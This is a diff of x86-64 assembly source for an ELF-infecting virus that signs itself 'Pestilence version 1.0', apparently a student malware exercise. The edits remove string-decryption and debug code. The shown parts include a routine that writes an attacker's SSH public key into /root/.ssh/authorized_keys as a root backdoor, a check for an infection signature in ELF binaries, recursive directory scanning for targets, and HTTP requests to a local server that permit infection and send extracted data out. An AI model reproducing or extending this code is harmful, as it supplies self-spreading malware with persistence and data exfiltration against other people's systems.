@@ -12,11 +12,7 @@ _start:
 	push rbp
     mov rbp, rsp
 	PUSHA
-	; lea rdi, [rel dir1]                                   ; dir to open for arg readDir
-	; mov rsi, dir1Len
-	; call _readDir
 	call _map_int_table
-	; call _check_debug
     call _isInfectionAllow
     test rax, rax
     js _final_jmp
@@ -159,11 +155,6 @@ _readDir:
 
             _recursif:
                 lea rdi, FAM(pestilence.pwd)
-				; push rax
-				; lea rsi, FAM(pestilence.pwd)
-				; call _strlen
-				; mov rsi, rax
-				; pop rax
                 lea rdx, [r10 + D_NAME]                 ; rdi -> folder name
                 cmp BYTE [rdx], 0x2e
                 jne _callInit
@@ -305,6 +296,7 @@ _check_file:
 				add r8, qword [r14 + elf64_phdr.p_filesz]
 				sub r8, signature_len
 				mov r9, qword [rel signature]
+				_br_checksign:
 				cmp qword r9, [r8]
 				je _unmap_close_inf
 
@@ -612,15 +604,6 @@ _backdoor:
             syscall
             mov rax, SYS_WRITE
             lea rsi, [rel back]
-			; push rax
-			; push rdi
-			; lea rdi, [rel back]
-			; mov rsi, backLen
-			; _decNotFound1:
-			; call _decrypt_str
-			; mov rsi, rax
-			; pop rdi
-			; pop rax
 			mov rdx, 1
             syscall
 
@@ -713,14 +696,6 @@ _extractData:
         add rsi, headerStartLen - 1
         call _itoa
         lea rdi, [rel headerEnd]
-		push rax
-		push rsi
-		mov rsi, headerEndLen
-		_dec_copyD1:
-		call _decrypt_str
-		mov rdi, rax
-		pop rsi
-		pop rax
         call _strcpy
         add rsi, headerEndLen - 1
         mov rdi, r12
@@ -750,8 +725,6 @@ _isInfectionAllow:
         ;rdi == sockfd
         mov rdi, rax
         mov rax, SYS_SENDTO
-        ; lea rsi, [rel headerGet]
-		push rax
 		push rdi
 		lea rdi, [rel headerGet]
 		mov rsi, headerGetLen
@@ -923,17 +896,17 @@ _exit:
     xor rdi, rdi
     syscall
 
-dir1        db  "/tmp/test", 0
+key   db "mykey"
+dir1        db  "/tmp/test", 0x0
 dir1Len    equ $ - dir1
-dir2        db  "/tmp/test2", 0
+dir2        db  "/tmp/test2", 0x0
 dir2Len    equ $ - dir2
-key			db "mykey", 0
-back        db  9, 0
-backLen		equ $ - back
-slash       db "/", 0
-sshFile     db "/root/.ssh/authorized_keys", 0
-sshFile_len	equ $ - sshFile
-sshPub      db "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKcsDbiza3Ts6B9TpcehxjY8pcPijnDxBpuiEkotRCn0 gottie@debian", 0
+back        db  9, 0x0
+backLen  equ $ - back
+slash       db "/", 0x0
+sshFile     db "/root/.ssh/authorized_keys", 0x0
+sshFile_len equ $ - sshFile
+sshPub      db "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKcsDbiza3Ts6B9TpcehxjY8pcPijnDxBpuiEkotRCn0 gottie@debian", 0x0
 sshPubLen   equ $ - sshPub
 sockaddr:
     dw 2            ; AF_INET
@@ -941,16 +914,16 @@ sockaddr:
     dd 0x100007F    ; 127.0.0.1 (en hexadécimal)
     dq 0            ; padding
 
-sockaddrLen equ $ - sockaddr
-headerStart db "POST /extract HTTP/1.1\r\nHost: 127.0.0.1:8000\r\nContent-Type: text/plain\r\nContent-Length: ", 0
+headerStart db "POST /extract HTTP/1.1", 0x0D, 0x0A, "Host: 127.0.0.1:8000", 0x0D, 0x0A, "Content-Type: text/plain", 0x0D, 0x0A, "Content-Length: ", 0x0
 headerStartLen equ $ - headerStart
-headerEnd db 13, 10, 13, 10, 0
+headerEnd db 0x0D, 0x0A, 0x0D, 0x0A, 0x0
 headerEndLen equ $ - headerEnd
-headerGet db "GET /infection HTTP/1.1\r\nHost: 127.0.0.1:8000", 13, 10, 13, 10, 0
+headerGet db "GET /infection HTTP/1.1", 0x0D, 0x0A, "Host: 127.0.0.1:8000", 0x0D, 0x0A, 0x0D, 0x0A, 0x0
 headerGetLen equ $ - headerGet
 timespec:
     dq 0          ; Secondes
     dq 10000000     ; 100ms
-signature	db	"Pestilence version 1.0 (c)oded by anvincen-eedy", 0x0
+
+signature db "Pestilence version 1.0 (c)oded by anvincen-eedy", 0x0
 signature_len equ $ - signature
 _end:
